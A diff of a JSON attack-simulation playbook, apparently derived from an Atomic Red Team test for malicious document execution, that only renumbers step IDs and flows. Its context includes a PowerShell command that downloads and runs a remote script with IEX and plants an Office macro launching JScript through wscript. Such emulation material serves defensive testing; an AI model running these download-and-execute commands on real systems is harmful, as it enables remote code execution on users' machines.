@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "7738f190-673f-4407-bf9f-52b0198224d4",
+      "id": "70ba9bdd-5339-4cfe-bbb6-cb680c2ec2a6",
       "type": "execute-command",
       "data": {
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "3b1416e5-8095-4844-bccd-efa0fe84033e",
+      "id": "6d4970d9-5487-4b00-8e01-6f39e4b475dd",
       "name": "Check dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "4ca94f21-b80b-4c31-8209-2484efca662d",
+      "id": "ae0ef130-d69a-41ee-9448-dac0fc48ee6a",
       "name": "Resolve dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "8d6de9fb-ea57-44f1-9ccb-ec3f9c3a71b5",
+      "id": "ccde9d73-8961-42dd-945c-80d7a1df9bc5",
       "name": "Re-check dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
@@ -51,24 +51,24 @@
   ],
   "flows": [
     {
-      "s": "3b1416e5-8095-4844-bccd-efa0fe84033e",
+      "s": "6d4970d9-5487-4b00-8e01-6f39e4b475dd",
       "p": "on-success",
-      "o": "7738f190-673f-4407-bf9f-52b0198224d4"
+      "o": "70ba9bdd-5339-4cfe-bbb6-cb680c2ec2a6"
     },
     {
-      "s": "3b1416e5-8095-4844-bccd-efa0fe84033e",
+      "s": "6d4970d9-5487-4b00-8e01-6f39e4b475dd",
       "p": "on-failure",
-      "o": "4ca94f21-b80b-4c31-8209-2484efca662d"
+      "o": "ae0ef130-d69a-41ee-9448-dac0fc48ee6a"
     },
     {
-      "s": "4ca94f21-b80b-4c31-8209-2484efca662d",
+      "s": "ae0ef130-d69a-41ee-9448-dac0fc48ee6a",
       "p": "on-success",
-      "o": "8d6de9fb-ea57-44f1-9ccb-ec3f9c3a71b5"
+      "o": "ccde9d73-8961-42dd-945c-80d7a1df9bc5"
     },
     {
-      "s": "8d6de9fb-ea57-44f1-9ccb-ec3f9c3a71b5",
+      "s": "ccde9d73-8961-42dd-945c-80d7a1df9bc5",
       "p": "on-failure",
-      "o": "7738f190-673f-4407-bf9f-52b0198224d4"
+      "o": "70ba9bdd-5339-4cfe-bbb6-cb680c2ec2a6"
     }
   ],
   "tags": [
